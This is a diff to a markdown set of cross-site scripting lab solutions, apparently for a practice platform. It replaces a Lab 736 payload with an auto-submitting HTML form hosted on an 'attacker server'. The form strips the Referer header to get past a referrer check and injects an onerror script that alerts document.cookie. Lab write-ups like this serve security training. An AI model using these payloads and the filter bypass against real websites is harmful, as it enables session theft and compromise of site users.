@@ -946,16 +946,25 @@ https://pzcihwu2.xssy.uk/target.ftl?name=<script>var meta = document.createEleme
 ---
 
 ### Lab 736: Referer Check
-- **URL Lab**: https://xssy.uk/lab/736
-- **Payload**: 
+- **URL Lab**: https://hacky.uk/lab/736
+- **Payload**: Upload this code to the attacker server
 ```html
-<img src=x onerror="alert(document.cookie)">
+<meta name="referrer" content="no-referrer" />
+<form id="submit" action="https://m3ult5ii.hacky.uk/target.ftl" method="post">
+  <input type="hidden" name="name" value="<img src=x onerror=alert(document.cookie)>" />
+ <input type="submit" value="Submit request" />
+</form>
+     <script>
+       document.getElementById('submit').submit();
+    </script>
+
 ```
-- **Full URL**: 
+- **Full URL**:
+after deploy, test the url & submit to the lab
 ```
-https://m3ult5ii.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3D%22alert%28document.cookie%29%22%3E
+https://eqh42jmm.hacky.uk/noreferer.html
 ```
-- **Description**: Switch parameter name from body to URL request
+- **Description**: The waf filter check the referrer, so we bypass with external script
 
 ---
 
